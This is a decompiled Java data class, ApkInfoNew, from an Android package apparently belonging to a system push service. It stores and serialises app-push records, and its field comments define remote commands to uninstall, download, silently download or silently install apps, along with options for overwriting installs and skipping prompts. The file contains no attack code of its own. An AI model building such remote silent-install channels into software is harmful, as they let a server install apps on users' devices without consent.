package com.zhuoyi.system.network.object;

import android.content.Context;
import com.zhuoyi.system.network.serializer.ByteField;
import com.zhuoyi.system.network.util.NetworkUtils;
import java.io.Serializable;
import org.json.JSONException;
import org.json.JSONObject;

public class ApkInfoNew implements Serializable {
    private static final long serialVersionUID = -1024013271572034915L;
    @ByteField(index = 2)
    private String appName;
    @ByteField(description = "动作命令1:卸载,2:下载并安装,3:静默下载,4:静默安装", index = 8)
    private short commandType;
    @ByteField(index = 14)
    private String displayPicUrl;
    @ByteField(index = 15)
    private String displayTime;
    @ByteField(index = 13)
    private byte displayType;
    @ByteField(index = 4)
    private String downloadUrl;
    @ByteField(index = 7)
    private String fileName;
    @ByteField(index = 5)
    private String fileVerifyCode;
    @ByteField(index = 0)
    private int iconId;
    @ByteField(index = 1)
    private String iconUrl;
    @ByteField(description = "是否覆盖安装:0不覆盖, 1:覆盖", index = 10)
    private byte isCover;
    @ByteField(description = "无root时是否提示： 1:提示  0:结束", index = 11)
    private byte isPrompt;
    @ByteField(description = "1:只限wifi,2:全部", index = 9)
    private short networkEnabled;
    @ByteField(index = 3)
    private String packageName;
    @ByteField(index = 12)
    private String promptType;
    @ByteField(index = 17)
    private String pushContent;
    @ByteField(index = 16)
    private String pushTitle;
    @ByteField(index = 18)
    private String reserved1;
    @ByteField(index = 19)
    private String reserved2;
    @ByteField(index = 20)
    private String reserved3;
    @ByteField(index = 21)
    private String reserved4;
    @ByteField(index = 22)
    private String reserved5;
    @ByteField(index = 23)
    private String reserved6;
    @ByteField(index = 6)
    private int verCode;

    public String getFileName() {
        return this.fileName;
    }

    public void setFileName(String fileName) {
        this.fileName = fileName;
    }

    public int hashCode() {
        return (this.packageName == null ? 0 : this.packageName.hashCode()) + 31;
    }

    public boolean equals(Object obj) {
        if (this == obj) {
            return true;
        }
        if (obj == null) {
            return false;
        }
        if (getClass() != obj.getClass()) {
            return false;
        }
        ApkInfoNew other = (ApkInfoNew) obj;
        if (this.packageName == null) {
            if (other.packageName != null) {
                return false;
            }
            return true;
        } else if (this.packageName.equals(other.packageName)) {
            return true;
        } else {
            return false;
        }
    }

    public String toString() {
        return "ApkInfoNew [iconId=" + this.iconId + ", iconUrl=" + this.iconUrl + ", appName=" + this.appName + ", packageName=" + this.packageName + ", downloadUrl=" + this.downloadUrl + ", fileVerifyCode=" + this.fileVerifyCode + ", verCode=" + this.verCode + ", fileName=" + this.fileName + ", commandType=" + this.commandType + ", networkEnabled=" + this.networkEnabled + ", isCover=" + this.isCover + ", isPrompt=" + this.isPrompt + ", promptType=" + this.promptType + ", displayType=" + this.displayType + ", displayPicUrl=" + this.displayPicUrl + ", displayTime=" + this.displayTime + ", pushTitle=" + this.pushTitle + ", pushContent=" + this.pushContent + ", reserved1=" + this.reserved1 + ", reserved2=" + this.reserved2 + ", reserved3=" + this.reserved3 + ", reserved4=" + this.reserved4 + ", reserved5=" + this.reserved5 + ", reserved6=" + this.reserved6 + "]";
    }

    public static ApkInfoNew getInstanceFromSaveString(String saveStr) {
        JSONException e;
        int i = 0;
        String str = null;
        ApkInfoNew info = null;
        try {
            JSONObject jo = new JSONObject(saveStr);
            ApkInfoNew info2 = new ApkInfoNew();
            try {
                int i2;
                String string;
                String string2;
                if (jo.has("iI")) {
                    i2 = jo.getInt("iI");
                } else {
                    i2 = 0;
                }
                info2.iconId = i2;
                if (jo.has("iU")) {
                    string = jo.getString("iU");
                } else {
                    string = null;
                }
                info2.iconUrl = string;
                if (jo.has("aN")) {
                    string = jo.getString("aN");
                } else {
                    string = null;
                }
                info2.appName = string;
                if (jo.has("pN")) {
                    string = jo.getString("pN");
                } else {
                    string = null;
                }
                info2.packageName = string;
                if (jo.has("dU")) {
                    string = jo.getString("dU");
                } else {
                    string = null;
                }
                info2.downloadUrl = string;
                if (jo.has("fVC")) {
                    string = jo.getString("fVC");
                } else {
                    string = null;
                }
                info2.fileVerifyCode = string;
                if (jo.has("vC")) {
                    i = jo.getInt("vC");
                }
                info2.verCode = i;
                if (jo.has("fN")) {
                    string2 = jo.getString("fN");
                } else {
                    string2 = null;
                }
                info2.fileName = string2;
                info2.commandType = Short.parseShort(jo.has("cT") ? jo.getString("cT") : "0");
                info2.networkEnabled = Short.parseShort(jo.has("nE") ? jo.getString("nE") : "0");
                info2.isCover = Byte.parseByte(jo.has("iC") ? jo.getString("iC") : "0");
                info2.isPrompt = Byte.parseByte(jo.has("iP") ? jo.getString("iP") : "0");
                if (jo.has("pT")) {
                    string2 = jo.getString("pT");
                } else {
                    string2 = null;
                }
                info2.promptType = string2;
                info2.displayType = Byte.parseByte(jo.has("dT") ? jo.getString("dT") : "0");
                if (jo.has("dPU")) {
                    string2 = jo.getString("dPU");
                } else {
                    string2 = null;
                }
                info2.displayPicUrl = string2;
                if (jo.has("dTime")) {
                    string2 = jo.getString("dTime");
                } else {
                    string2 = null;
                }
                info2.displayTime = string2;
                if (jo.has("pTitle")) {
                    string2 = jo.getString("pTitle");
                } else {
                    string2 = null;
                }
                info2.pushTitle = string2;
                if (jo.has("pC")) {
                    str = jo.getString("pC");
                }
                info2.pushContent = str;
                return info2;
            } catch (JSONException e2) {
                e = e2;
                info = info2;
                e.printStackTrace();
                return info;
            }
        } catch (JSONException e3) {
            e = e3;
            e.printStackTrace();
            return info;
        }
    }

    public String getSaveString() {
        JSONObject jo = new JSONObject();
        try {
            jo.put("iI", this.iconId);
            jo.put("iU", this.iconUrl);
            jo.put("aN", this.appName);
            jo.put("pN", this.packageName);
            jo.put("dU", this.downloadUrl);
            jo.put("fVC", this.fileVerifyCode);
            jo.put("vC", this.verCode);
            jo.put("fN", this.fileName);
            jo.put("cT", Short.toString(this.commandType));
            jo.put("nE", Short.toString(this.networkEnabled));
            jo.put("iC", Byte.toString(this.isCover));
            jo.put("iP", Byte.toString(this.isPrompt));
            jo.put("pT", this.promptType);
            jo.put("dT", Byte.toString(this.displayType));
            jo.put("dPU", this.displayPicUrl);
            jo.put("dTime", this.displayTime);
            jo.put("pTitle", this.pushTitle);
            jo.put("pC", this.pushContent);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jo.toString();
    }

    public int getIconId() {
        return this.iconId;
    }

    public void setIconId(int iconId) {
        this.iconId = iconId;
    }

    public String getIconUrl() {
        return this.iconUrl;
    }

    public void setIconUrl(String iconUrl) {
        this.iconUrl = iconUrl;
    }

    public String getAppName() {
        return this.appName;
    }

    public void setAppName(String appName) {
        this.appName = appName;
    }

    public String getPackageName() {
        return this.packageName;
    }

    public void setPackageName(String packageName) {
        this.packageName = packageName;
    }

    public String getDownloadUrl() {
        return this.downloadUrl;
    }

    public void setDownloadUrl(String downloadUrl) {
        this.downloadUrl = downloadUrl;
    }

    public String getFileVerifyCode() {
        return this.fileVerifyCode;
    }

    public void setFileVerifyCode(String fileVerifyCode) {
        this.fileVerifyCode = fileVerifyCode;
    }

    public int getVerCode() {
        return this.verCode;
    }

    public void setVerCode(int verCode) {
        this.verCode = verCode;
    }

    public short getCommandType() {
        return this.commandType;
    }

    public void setCommandType(short commandType) {
        this.commandType = commandType;
    }

    public short getNetworkEnabled() {
        return this.networkEnabled;
    }

    public void setNetworkEnabled(short networkEnabled) {
        this.networkEnabled = networkEnabled;
    }

    public byte getIsCover() {
        return this.isCover;
    }

    public void setIsCover(byte isCover) {
        this.isCover = isCover;
    }

    public byte getIsPrompt() {
        return this.isPrompt;
    }

    public void setIsPrompt(byte isPrompt) {
        this.isPrompt = isPrompt;
    }

    public String getPromptType() {
        return this.promptType;
    }

    public void setPromptType(String promptType) {
        this.promptType = promptType;
    }

    public byte getDisplayType() {
        return this.displayType;
    }

    public void setDisplayType(byte displayType) {
        this.displayType = displayType;
    }

    public String getDisplayPicUrl() {
        return this.displayPicUrl;
    }

    public void setDisplayPicUrl(String displayPicUrl) {
        this.displayPicUrl = displayPicUrl;
    }

    public String getDisplayTime() {
        return this.displayTime;
    }

    public void setDisplayTime(String displayTime) {
        this.displayTime = displayTime;
    }

    public String getPushTitle() {
        return this.pushTitle;
    }

    public void setPushTitle(String pushTitle) {
        this.pushTitle = pushTitle;
    }

    public String getPushContent() {
        return this.pushContent;
    }

    public void setPushContent(String pushContent) {
        this.pushContent = pushContent;
    }

    public String getReserved1() {
        return this.reserved1;
    }

    public void setReserved1(String reserved1) {
        this.reserved1 = reserved1;
    }

    public String getReserved2() {
        return this.reserved2;
    }

    public void setReserved2(String reserved2) {
        this.reserved2 = reserved2;
    }

    public String getReserved3() {
        return this.reserved3;
    }

    public void setReserved3(String reserved3) {
        this.reserved3 = reserved3;
    }

    public String getReserved4() {
        return this.reserved4;
    }

    public void setReserved4(String reserved4) {
        this.reserved4 = reserved4;
    }

    public String getReserved5() {
        return this.reserved5;
    }

    public void setReserved5(String reserved5) {
        this.reserved5 = reserved5;
    }

    public String getReserved6() {
        return this.reserved6;
    }

    public void setReserved6(String reserved6) {
        this.reserved6 = reserved6;
    }

    public SerApkInfo switchToSerApkInfo() {
        SerApkInfo info = new SerApkInfo();
        info.setAppName(this.appName);
        info.setCommandType(this.commandType);
        info.setDownloadUrl(this.downloadUrl);
        info.setFileVerifyCode(this.fileVerifyCode);
        info.setIconId(this.iconId);
        info.setIconUrl(this.iconUrl);
        info.setNetworkEnabled(this.networkEnabled);
        info.setPackageName(this.packageName);
        info.setVer(this.verCode);
        info.setVerName("");
        info.setFileName("apk");
        return info;
    }

    public PromAppInfo switchToPromAppInfo() {
        PromAppInfo info = new PromAppInfo();
        info.setType((byte) 1);
        info.setAdType(this.displayType);
        info.setTitle(this.pushTitle);
        info.setTip(this.pushContent);
        info.setFileVerifyCode(this.fileVerifyCode);
        info.setPackageName(this.packageName);
        info.setDisplayTime(this.displayTime);
        info.setIconId(this.iconId);
        info.setAction(this.downloadUrl);
        info.setActionType((byte) 1);
        info.setUrl(this.iconUrl);
        info.setId(this.iconId);
        info.setVer(this.verCode);
        info.setAppName(this.appName);
        info.setShowIconId(this.iconId);
        info.setShowPicUrl(this.displayPicUrl);
        return info;
    }

    public PromAppInfo switchToPromAppInfo(Context context) {
        PromAppInfo info = switchToPromAppInfo();
        info.setReserved1("pushNetwork=" + this.networkEnabled + ";" + "pushFrom=silent;" + "todyTime=" + NetworkUtils.getPushDisplayTime("00:01") + ";");
        return info;
    }
}
